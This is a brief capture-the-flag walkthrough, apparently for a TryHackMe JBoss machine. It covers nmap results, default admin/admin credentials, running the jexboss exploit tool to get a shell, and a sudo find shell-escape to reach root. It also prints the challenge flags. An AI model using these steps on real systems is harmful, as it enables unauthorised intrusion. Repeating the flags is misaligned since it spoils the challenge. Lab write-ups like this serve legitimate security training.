```
export IP=10.10.154.169

Nmap
------------------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
1090/tcp open  java-rmi    syn-ack ttl 63 Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    syn-ack ttl 63 Java RMI
1098/tcp open  java-rmi    syn-ack ttl 63 Java RMI
1099/tcp open  java-object syn-ack ttl 63 Java Object Serialization
3873/tcp open  java-object syn-ack ttl 63 Java Object Serialization
4446/tcp open  java-object syn-ack ttl 63 Java Object Serialization
4712/tcp open  msdtc       syn-ack ttl 63 Microsoft Distributed Transaction Coordinator (error)
5445/tcp open  smbdirect?  syn-ack ttl 63
5500/tcp open  hotline?    syn-ack ttl 63
5501/tcp open  tcpwrapped  syn-ack ttl 63
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
8083/tcp open  http        syn-ack ttl 63 JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
------------------------------------------

Tony says there is a deeper meaning in his images
strings on the file gives us our user flag

user flag
=================================
strings be2sOV9.jpg | grep -i "THM"
}THM{Tony_Sure_Loves_Frosted_Flakes}
=================================

In port 8080 , admin console we have default creds.
username	:	admin
password	:	admin

When search for jboss exploit we got a tool jexboss
python jexboss.py -u $IP:8080

And we got our shell!!

jboss user flag
=================================
THM{50c10ad46b5793704601ecdad865eb06}
=================================

In Jboss home, we have a note file.
Password: likeaboss

sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find

sudo /usr/bin/find . -exec /bin/sh \; -quit
We are root!!

cat root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
(base64 -> md5)
zxcvbnm123456789
```